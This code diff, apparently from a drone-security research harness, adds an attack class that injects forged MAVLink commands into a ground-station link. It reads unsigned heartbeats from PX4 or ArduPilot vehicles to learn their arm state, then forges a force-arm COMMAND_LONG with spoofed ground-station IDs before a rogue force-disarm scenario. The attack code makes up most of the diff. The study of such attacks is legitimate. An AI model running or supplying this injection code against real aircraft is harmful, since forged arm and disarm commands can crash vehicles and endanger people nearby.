@@ -71,6 +71,7 @@ class _DownlinkRewriteBase:
         self.frames_seen = 0
         self.frames_modified = 0
         self.frames_skipped_signed = 0
+        self.frames_rewrite_failed = 0
 
     def _maybe_learn_target(self, ctx: FrameContext) -> None:
         if self._target_sysid is not None or ctx.direction != "down" or ctx.msgid != HEARTBEAT_ID or ctx.signed:
@@ -152,6 +153,7 @@ class _DownlinkRewriteBase:
                 return [ctx.raw]
             new_raw = _pack_v2(msg, ctx)
         except Exception:
+            self.frames_rewrite_failed += 1
             return [ctx.raw]
 
         self.frames_modified += 1
@@ -315,11 +317,64 @@ class BenignPilotControlHook:
         self.frames_injected = 0
         self.frames_modified = 0
         self.frames_skipped_signed = 0
+        self.frames_rewrite_failed = 0
         self.acks_accepted = 0
 
     def __call__(self, ctx: FrameContext) -> list[bytes]:
         self.frames_seen += 1
         return [ctx.raw]
+
+
+class RogueForceDisarmAttack(CommandInjectionAttack):
+    """Arms the vehicle on the ground (if disarmed) before injecting rogue force-disarm (#24)."""
+
+    def __init__(self, *args: Any, auto_arm_if_disarmed: bool = True, **kwargs: Any) -> None:
+        super().__init__(*args, **kwargs)
+        self.auto_arm_if_disarmed = bool(auto_arm_if_disarmed)
+        self.vehicle_armed_observed = False
+        self.pre_arm_sent = False
+        self._hb_decoder = mav2.MAVLink(None)
+
+    def __call__(self, ctx: FrameContext) -> list[bytes]:
+        if ctx.direction == "down" and ctx.msgid == HEARTBEAT_ID and not ctx.signed:
+            try:
+                m = self._hb_decoder.decode(bytearray(ctx.raw))
+                if m.get_type() == "HEARTBEAT" and getattr(m, "autopilot", None) in (
+                    _MAV_AUTOPILOT_PX4,
+                    mav2.MAV_AUTOPILOT_ARDUPILOTMEGA,
+                ):
+                    self.vehicle_armed_observed = bool(int(getattr(m, "base_mode", 0)) & 0x80)
+            except Exception:
+                pass
+        out = super().__call__(ctx)
+        if (
+            ctx.direction == "up"
+            and self.auto_arm_if_disarmed
+            and not self.vehicle_armed_observed
+            and not self.pre_arm_sent
+            and self._target_sysid is not None
+            and self._target_compid is not None
+        ):
+            self.pre_arm_sent = True
+            enc = mav2.MAVLink(None, srcSystem=255, srcComponent=190)
+            enc.seq = (ctx.seq + 1) & 0xFF
+            arm_frame = bytes(
+                enc.command_long_encode(
+                    self._target_sysid,
+                    self._target_compid,
+                    400,
+                    0,
+                    1.0,
+                    21196.0,
+                    0.0,
+                    0.0,
+                    0.0,
+                    0.0,
+                    0.0,
+                ).pack(enc)
+            )
+            return [out[0], arm_frame, *out[1:]]
+        return out
 
 
 def build_restricted_visibility_hook(
@@ -341,7 +396,7 @@ def build_restricted_visibility_hook(
     """
     params = draw_command_injection_params(seed, trial_index=trial_index)
     if scenario == "rogue_force_disarm":
-        return CommandInjectionAttack(
+        return RogueForceDisarmAttack(
             params,
             target_sysid=target_sysid,
             target_compid=target_compid,
@@ -352,6 +407,7 @@ def build_restricted_visibility_hook(
             warmup_s=warmup_s,
             frame_log=frame_log,
             seq_policy="own_counter",
+            auto_arm_if_disarmed=False,
         )
     if scenario == "gcs_forgery_own_counter":
         return CommandInjectionAttack(
